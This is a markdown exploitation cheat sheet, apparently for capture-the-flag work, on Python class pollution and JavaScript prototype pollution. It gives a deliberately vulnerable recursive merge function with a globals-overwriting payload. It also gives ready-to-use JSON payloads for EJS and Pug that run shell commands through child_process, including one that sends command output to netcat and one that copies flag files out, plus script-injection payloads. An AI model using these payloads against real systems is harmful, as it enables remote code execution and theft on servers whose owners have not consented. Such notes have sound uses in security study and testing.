
## Python class injection 

```python

class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""
        

# Vulenrable function
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)



secret= '13241341234'

injection = {"__class__":{"__init__":{"__globals__":{"flag":"hacked"}}}}
# feedback.__class__.__init__.__globals__['secret'] = 'hacked'
feedback = Feedback()
merge(injection, feedback)
print(flag)

```

# Javascript Prototype Pollution


## RCE in EjS 
- source [PoC-CVE-2024-33883](https://github.com/Grantzile/PoC-CVE-2024-33883)
- source [ejs-server-side-prototype-pollution-gadgets-to-rce](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

### Exploit
```json
{
    "__proto__": {
        "client": 1,
        "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
    }
}
```


## AST Prototype Pollution

### Pug
- source [how-ast-injection-and-prototype-pollution-ignite-threats](https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68)
- source [JS Prototype Chain Pollution and AST Injection Questions](https://rayepeng.net/JS-yuan-xing-lian-wu-ran-ji-AST-zhu-ru-de-ji-dao-ti-mu?locale=en)

#### How Attack works
```javascript
const pug = require('pug');

Object.prototype.block = {"type":"Text","val":`<script>alert(origin)</script>`};

const source = `h1= msg`;

var fn = pug.compile(source, {});
var html = fn({msg: 'It works'});

console.log(html); // <h1>It works<script>alert(origin)</script></h1>
```

#### Exploit 
- [CVE-2020-36632](https://security.snyk.io/vuln/SNYK-JS-FLAT-596927)

**For RCE use line**
```json
{
"__proto__.block": {
"type": "Text",
"line":
"process.mainModule.require('child_process').execSync('cat /app/flag* > /app/static/f.txt')"
}
}
```

**For XSS use val**
this will chnage every value evualated by AST to payload 
```json
{
"artist.name":"Gingell",
"__proto__.block": {
"type": "Text",
"val":
"<script>alert(1)</script>')"
}
```

### Handlebars
- source [hacktricks ast-prototype-pollution-in-nodejs](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#ast-prototype-pollution-in-nodejs)

```
```
